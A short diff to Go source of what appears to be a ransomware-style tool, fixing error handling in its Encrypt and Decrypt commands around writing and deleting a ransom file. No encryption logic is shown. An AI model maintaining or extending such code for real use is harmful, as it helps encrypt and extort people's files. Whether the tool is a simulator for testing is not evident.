@@ -190,7 +190,9 @@ func Encrypt(ctx *urfavecli.Context) error {
 				return err
 			}
 
-			writer.Flush()
+			if err := writer.Flush(); err != nil {
+				return err
+			}
 		} else {
 			log.Printf("Ransom file already exists at %s. Skipping generation", ransomPath)
 		}
@@ -258,10 +260,12 @@ func Decrypt(ctx *urfavecli.Context) error {
 		return nil
 	})
 
-	// Delete root ransom file (if any)
-	fs.DeleteFileIfExists(filepath.Join(absolutePath, ransomFileName))
+	if err != nil {
+		return err
+	}
 
-	return err
+	// Delete root ransom file (if any)
+	return fs.DeleteFileIfExists(filepath.Join(absolutePath, ransomFileName))
 }
 
 func encryptFile(path string, aesKey crypto.AesKey, encryptedAesKey []byte, encSuffix string) error {
